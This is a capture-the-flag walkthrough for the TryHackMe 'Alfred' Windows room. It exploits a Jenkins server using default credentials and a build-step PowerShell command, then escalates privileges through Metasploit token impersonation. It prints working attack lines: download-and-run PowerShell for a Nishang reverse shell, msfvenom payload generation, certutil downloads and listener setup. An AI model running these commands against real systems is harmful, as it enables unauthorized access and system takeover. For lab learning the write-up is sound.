
Exploit Jenkins to gain an initial shell, then escalate your privileges by exploiting Windows authentication tokens.

[Alfred](https://tryhackme.com/room/alfred)

---

We will be exploiting this box today. According to the brief overview this is a windows application and it is recommended that we use the [Nishang](https://github.com/samratashok/nishang) project to gain initial access. Also they specified that we use this [specific script](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)

# Initial Access
## How many ports are open? (TCP only)

### Enumeration

#### nmap

```bash
┌──(root㉿kali)-[/home/z3tssu]
└─# nmap -v 10.10.34.156 -Pn
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-12 07:56 +04
Initiating Parallel DNS resolution of 1 host. at 07:56
Completed Parallel DNS resolution of 1 host. at 07:56, 0.11s elapsed
Initiating SYN Stealth Scan at 07:56
Scanning 10.10.34.156 [1000 ports]
Discovered open port 80/tcp on 10.10.34.156
Discovered open port 8080/tcp on 10.10.34.156
Discovered open port 3389/tcp on 10.10.34.156
Completed SYN Stealth Scan at 07:56, 17.19s elapsed (1000 total ports)
Nmap scan report for 10.10.34.156
Host is up (0.25s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT     STATE SERVICE
80/tcp   open  http
3389/tcp open  ms-wbt-server
8080/tcp open  http-proxy
```

There are 3 open ports from the Nmap scan above. Lets explore the webservers on port 80 and port 8080.

## What is the username and password for the login panel?

### Webserver Enumeration

Viewing the webserver on port 80:
![[Pasted image 20251013214110.png]]

Viewing the webserver on port 8080:
![[Pasted image 20251013214126.png]]
So there are two webservers, one is a website hosted claiming that Bruce Wayne is dead and there is an address specified:

```bash
alfred@wayneenterprises.com
```

The other one seems to be access to the Jenkins platform with a username and password field.

### Default Credentials
1. Lets try using admin:admin on the webserver login
2. It WORKED
![[Pasted image 20251013214248.png]]

## What is the User.txt flag?

We get a hint of how to continue exploiting this room

Find a feature of the tool that allows you to execute commands on the underlying system. When you find this feature, you can use this command to get the reverse shell on your machine and then run it: powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port

You first need to download the Powershell script and make it available for the server to download. You can do this by creating an http server with python: python3 -m http.server
### Finding the feature that allows for code execution

1. Navigate to the following: http://10.10.206.196:8080/job/project/configure
![[Pasted image 20251013215624.png]]

2. Once we put the code in side the code block we go back to the page and press "Build Now"
![[Pasted image 20251013215723.png]]
### Download the Nishang Script 
1. Run the following
```shell
wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
```
2. Start our webserver on out attacker machine with the following
```bash
python -m http.server 8000
```

### Exploit the command injection vulnerability
We can now exploit the command injection vulnerability in the vulnerable part of the application to get a reverse shell by the command below

```shell
powershell iex (New-Object  Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp  -Reverse -IPAddress your-ip -Port your-port
```

replace http://your-ip:your-port/Invoke-PowerShellTcp.ps1 with the address obtained from your updog webserver

```powershell
powershell iex (New-Object  Net.WebClient).DownloadString('http://10.9.0.78:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp  -Reverse -IPAddress 10.9.0.78 -Port 4444
```

Copy the above command to the configure section as discussed above and when done, apply and save it, then press the build now button and now we should have a netcat shell activated back on our attacker machine

![[Pasted image 20251013220253.png]]

lets find the user.txt file now

Use the following to quickly find a text file using powershell query
```shell
Get-ChildItem -Path C:\ -Filter "user.txt" -Recurse -ErrorAction SilentlyContinue
```
![[Pasted image 20251013220613.png]]
### Read the file once found

```powershell
Get-Content C:\Users\bill\Desktop\user.txt
# or
type C:\Users\bill\Desktop\user.txt
```
![[Pasted image 20251013220646.png]]

# Switching Shells

Time to upgrade our shells from a simple netcat shell to a meterpreter shell
## Generate the MSFVenom Payload

```bash
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.9.0.78 LPORT=9090 -f exe -o SHELL.exe
```
## Download the payload on the webserver 1
1. We already have our python server running
2. Lets download it from our attacker machine onto the webserver using the below command

```shell
powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.9.3.69:9090/switch_shell.exe','switch_shell.exe')"
```

![[Pasted image 20251013221421.png]]

## Download the payload on the webserver 2
The above method was giving issues, so i tried using: Certutil

```
certutil -urlcache -f http://10.9.3.69:9090/switch_shell.exe switch_shell.exe
```

![[Pasted image 20251013224956.png]]

Certutil seems to have worked~~

---
## Setup a Meterpreter Listener 
```
msfconsole -q -x "use exploit/multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 10.9.3.69 set 9090 listening-port run"
```
![[Pasted image 20251013222045.png]]

## Execute the payload on the webserver
use the following command in the shell code on the webserver
```
Start-Process "switch_shell.exe"
```

OR 

```bash
.\SHELL.exe
```

## Shell obtained
![[Pasted image 20251014202242.png]]

# Priv Esc

## Token Impersonation
### View all privileges 
1. Change the meterpreter to a shell
```
shell
```
2. View the privileges of the user
```bash
whoami /priv
```

![[Pasted image 20251014202749.png]]

- We see that there are two privilege that are enabled whilst the others are disabled
## Exploit the enabled privileges with incognito module
1. use ***load incognito*** to load the incognito module in metasploit 
![[Pasted image 20251014203040.png]]

2. Check which tokens are available using ***list_token -g*** 
![[Pasted image 20251014203242.png]]

3. Impersonate the Administrator token using ***impersonate_token "BUILDIN\Administrators"***
```
impersonate_token "BUILDIN\Administrators"
```
![[Pasted image 20251014203424.png]]

## Migrating to a process
So even though you impersonate a token with higher privileges it does not mean that you will receive the permissioned, because of how Windows handles these tokens.
- To bypass this, we will need to migrate to a process 
- Safest one to migrate to is the ***services.exe*** process 

1. Use the ***ps*** command to view the processes 
![[Pasted image 20251014203802.png]]

2. Find the ***services.exe*** process 
3. Migrate to the process using ***migrate PID-of-Process*** 
![[Pasted image 20251014203837.png]]

## Read the root.txt file located at C:\Windows\System32\config

```
more root.txt
```

![[Pasted image 20251014204000.png]]